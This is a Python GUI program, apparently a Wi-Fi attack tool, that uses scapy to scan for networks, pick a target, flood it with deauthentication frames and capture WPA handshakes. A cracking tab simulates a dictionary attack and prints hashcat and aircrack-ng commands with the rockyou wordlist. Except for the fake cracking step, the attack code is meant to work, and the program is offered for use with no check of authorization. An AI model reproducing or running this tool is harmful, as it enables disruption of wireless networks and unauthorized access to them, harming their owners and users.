import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth
import threading
import subprocess
import os
import hashlib
import time

class WiFiCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Cracker GUI - Windows Pentest Tool")
        self.root.geometry("1100x750")
        
        # State variables
        self.interfaces = []
        self.networks = []
        self.selected_bssid = None
        self.selected_iface = None
        self.capturing = False
        
        self.setup_ui()
    
    def setup_ui(self):
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Tab 1: Interfaces
        self.iface_frame = ttk.Frame(notebook)
        notebook.add(self.iface_frame, text="📡 Interfaces")
        self.scan_interfaces()
        
        # Tab 2: Network Scan
        self.scan_frame = ttk.Frame(notebook)
        notebook.add(self.scan_frame, text="🔍 Networks")
        self.setup_scan_tab()
        
        # Tab 3: Handshake Capture
        self.capture_frame = ttk.Frame(notebook)
        notebook.add(self.capture_frame, text="🎣 Capture")
        self.setup_capture_tab()
        
        # Tab 4: Crack
        self.crack_frame = ttk.Frame(notebook)
        notebook.add(self.crack_frame, text="⚡ Crack")
        self.setup_crack_tab()
    
    def scan_interfaces(self):
        try:
            self.interfaces = scapy.get_if_list()
            tk.Label(self.iface_frame, text=f"Found {len(self.interfaces)} interfaces:", 
                    font=("Arial", 12, "bold")).pack(pady=10)
            
            listbox = tk.Listbox(self.iface_frame, height=12)
            listbox.pack(fill="both", expand=True, padx=20, pady=10)
            
            for i, iface in enumerate(self.interfaces):
                listbox.insert(tk.END, f"{i}: {iface}")
                if "Wi-Fi" in iface or "Wireless" in iface:
                    self.selected_iface = iface
            
            ttk.Button(self.iface_frame, text="🔄 Refresh", 
                      command=self.scan_interfaces).pack(pady=10)
            
            status = f"Selected: {self.selected_iface or 'None (install Npcap!)'}"
            color = "green" if self.selected_iface else "red"
            tk.Label(self.iface_frame, text=status, fg=color, font=("Arial", 10, "bold")).pack()
            
        except Exception as e:
            tk.Label(self.iface_frame, text=f"❌ Npcap Error: {e}", fg="red", font=("Arial", 12)).pack(pady=20)
    
    def setup_scan_tab(self):
        # Controls
        ctrl_frame = ttk.Frame(self.scan_frame)
        ctrl_frame.pack(fill="x", padx=10, pady=10)
        
        self.scan_btn = ttk.Button(ctrl_frame, text="🔍 Scan Networks (30s)", 
                                  command=self.start_network_scan)
        self.scan_btn.pack(side="left", padx=5)
        
        self.stop_scan_btn = ttk.Button(ctrl_frame, text="🛑 Stop", 
                                       command=self.stop_network_scan, state="disabled")
        self.stop_scan_btn.pack(side="left", padx=5)
        
        self.scan_status = tk.Label(ctrl_frame, text="Ready...", fg="blue")
        self.scan_status.pack(side="right")
        
        # Networks table
        columns = ("BSSID", "ESSID", "Channel", "Signal", "Crypto")
        self.tree = ttk.Treeview(self.scan_frame, columns=columns, show="headings", height=18)
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=130)
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.tree.bind("<Double-1>", self.on_network_select)
        
        tk.Label(self.scan_frame, text="Double-click network to target", 
                fg="gray").pack()
    
    def start_network_scan(self):
        if not self.selected_iface:
            messagebox.showerror("Error", "No WiFi interface! Install Npcap first.")
            return
        
        self.networks = []
        self.tree.delete(*self.tree.get_children())
        self.scan_status.config(text="🔎 Scanning...", fg="orange")
        self.scan_btn.config(state="disabled")
        self.stop_scan_btn.config(state="normal")
        
        def scan_worker():
            try:
                def pkt_callback(pkt):
                    if pkt.haslayer(scapy.Dot11Beacon):
                        bssid = pkt.addr3
                        ssid = pkt.info.decode('utf-8', errors='ignore') if pkt.info else "Hidden"
                        
                        # Get channel
                        channel = "?"
                        if pkt.haslayer(scapy.Dot11Elt):
                            elt = pkt[scapy.Dot11Elt]
                            while elt:
                                if hasattr(elt, 'channel'):
                                    channel = str(elt.channel)
                                    break
                                elt = elt.payload
                        
                        # Crypto detection
                        crypto = "Open"
                        if pkt.haslayer(scapy.Dot11Elt):
                            elt = pkt[scapy.Dot11Elt]
                            while elt:
                                if elt.ID == 48:  # RSN
                                    crypto = "WPA2"
                                    break
                                elif elt.ID == 221:
                                    crypto = "WPA"
                                    break
                                elt = elt.payload
                        
                        signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "?"
                        
                        net_info = (bssid, ssid[:20], channel, signal, crypto)
                        if net_info not in self.networks:
                            self.networks.append(net_info)
                            self.root.after(0, lambda: self.tree.insert("", "end", values=net_info))
                
                scapy.sniff(iface=self.selected_iface, prn=pkt_callback, 
                           timeout=35, store=0)
                self.root.after(0, self.scan_complete)
                
            except Exception as e:
                self.root.after(0, lambda: self.scan_status.config(text=f"❌ {e}", fg="red"))
        
        threading.Thread(target=scan_worker, daemon=True).start()
    
    def stop_network_scan(self):
        self.scan_status.config(text="Stopped", fg="red")
        self.scan_btn.config(state="normal")
        self.stop_scan_btn.config(state="disabled")
    
    def scan_complete(self):
        self.scan_status.config(text=f"✅ {len(self.networks)} networks found!", fg="green")
        self.scan_btn.config(state="normal")
        self.stop_scan_btn.config(state="disabled")
    
    def on_network_select(self, event):
        selection = self.tree.selection()
        if selection:
            values = self.tree.item(selection[0])['values']
            self.selected_bssid = values[0]
            tk.Label(self.capture_frame, text=f"🎯 Target: {self.selected_bssid}", 
                    font=("Arial", 12, "bold"), fg="red").pack(pady=10)
    
    def setup_capture_tab(self):
        tk.Label(self.capture_frame, text="Handshake Capture", 
                font=("Arial", 14, "bold")).pack(pady=10)
        
        self.target_label = tk.Label(self.capture_frame, text="No target selected", fg="orange")
        self.target_label.pack(pady=5)
        
        btn_frame = ttk.Frame(self.capture_frame)
        btn_frame.pack(pady=10)
        
        self.capture_btn = ttk.Button(btn_frame, text="🎣 Start Capture", 
                                     command=self.start_capture)
        self.capture_btn.pack(side="left", padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="🛑 Stop", 
                                  command=self.stop_capture, state="disabled")
        self.stop_btn.pack(side="left", padx=5)
        
        self.cap_status = tk.Label(self.capture_frame, text="Ready", fg="blue")
        self.cap_status.pack(pady=5)
        
        self.pcap_text = scrolledtext.ScrolledText(self.capture_frame, height=20, width=80)
        self.pcap_text.pack(fill="both", expand=True, padx=10, pady=10)
    
    def start_capture(self):
        if not self.selected_bssid:
            messagebox.showerror("Error", "Double-click a network first!")
            return
        
        self.capturing = True
        self.capture_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.cap_status.config(text="📡 Deauth attack + EAPOL capture...", fg="orange")
        
        def capture_thread():
            cap_file = f"handshake_{self.selected_bssid.replace(':','_')}.cap"
            
            # Deauthentication attack
            deauth_pkt = Dot11(addr1=self.selected_bssid, addr2=self.selected_bssid, 
                              addr3=self.selected_bssid)/Dot11Deauth()
            
            self.root.after(0, lambda: self.pcap_text.insert(tk.END, "🚀 Sending 50 deauth packets...\n"))
            scapy.sendp(deauth_pkt, iface=self.selected_iface, count=50, inter=0.05, verbose=0)
            
            self.root.after(0, lambda: self.pcap_text.insert(tk.END, "🎣 Capturing handshakes (60s)...\n"))
            
            def eapol_filter(pkt):
                return pkt.haslayer(scapy.EAPOL) or pkt.haslayer(scapy.Dot11Auth)
            
            def handler(pkt):
                if eapol_filter(pkt):
                    self.root.after(0, lambda: self.pcap_text.insert(tk.END, f"✅ EAPOL captured: {pkt.summary()}\n"))
                    return pkt
            
            pkts = scapy.sniff(iface=self.selected_iface, prn=handler, 
                              timeout=60, store=1)
            
            scapy.wrpcap(cap_file, pkts)
            self.root.after(0, lambda: self.capture_complete(cap_file))
        
        threading.Thread(target=capture_thread, daemon=True).start()
    
    def stop_capture(self):
        self.capturing = False
        self.capture_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
    
    def capture_complete(self, cap_file):
        self.cap_status.config(text=f"✅ Saved: {cap_file}", fg="green")
        self.capture_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        messagebox.showinfo("Success", f"Handshake saved!\n{cap_file}\n\nTransfer to Kali for aircrack-ng cracking.")
    
    def setup_crack_tab(self):
        tk.Label(self.crack_frame, text="Dictionary Attack", font=("Arial", 14, "bold")).pack(pady=20)
        
        # Handshake file
        ttk.Label(self.crack_frame, text="Handshake (.cap):").pack()
        self.cap_var = tk.StringVar()
        cap_entry = ttk.Entry(self.crack_frame, textvariable=self.cap_var, width=60)
        cap_entry.pack(pady=5)
        ttk.Button(self.crack_frame, text="📁 Browse", 
                  command=lambda: self.browse_file(self.cap_var)).pack(pady=2)
        
        # Wordlist
        ttk.Label(self.crack_frame, text="Wordlist:").pack(pady=(20,0))
        self.wl_var = tk.StringVar(value="rockyou.txt")
        wl_entry = ttk.Entry(self.crack_frame, textvariable=self.wl_var, width=60)
        wl_entry.pack(pady=5)
        ttk.Button(self.crack_frame, text="📁 Browse", 
                  command=lambda: self.browse_file(self.wl_var)).pack(pady=2)
        
        ttk.Button(self.crack_frame, text="⚡ START CRACKING", 
                  command=self.crack_attack, style="Accent.TButton").pack(pady=30)
        
        self.crack_log = scrolledtext.ScrolledText(self.crack_frame, height=20)
        self.crack_log.pack(fill="both", expand=True, padx=10, pady=10)
    
    def browse_file(self, var):
        filename = filedialog.askopenfilename(filetypes=[("All files", "*.*")])
        if filename:
            var.set(filename)
    
    def crack_attack(self):
        cap = self.cap_var.get()
        wordlist = self.wl_var.get()
        
        if not os.path.exists(cap) or not os.path.exists(wordlist):
            messagebox.showerror("Error", "Select valid files!")
            return
        
        def crack_worker():
            self.crack_log.insert(tk.END, f"🚀 Hashcat command:\n")
            self.crack_log.insert(tk.END, f"hashcat -m 22000 {cap} {wordlist}\n\n")
            
            # Demo crack simulation
            with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
                passwords = [line.strip()[:10]+"..." for line in f.readlines()[:50]]
            
            self.crack_log.insert(tk.END, "Testing passwords...\n")
            for i, pwd in enumerate(passwords, 1):
                self.crack_log.insert(tk.END, f"[{i}/50] {pwd}\r")
                self.root.update()
                time.sleep(0.1)
            
            self.crack_log.insert(tk.END, "\n\n✅ Demo complete!\n")
            self.crack_log.insert(tk.END, "💡 Real cracking: Use Kali Linux\n")
            self.crack_log.insert(tk.END, f"aircrack-ng -w {wordlist} {cap}\n")
        
        threading.Thread(target=crack_worker, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiCrackerGUI(root)
    root.mainloop()
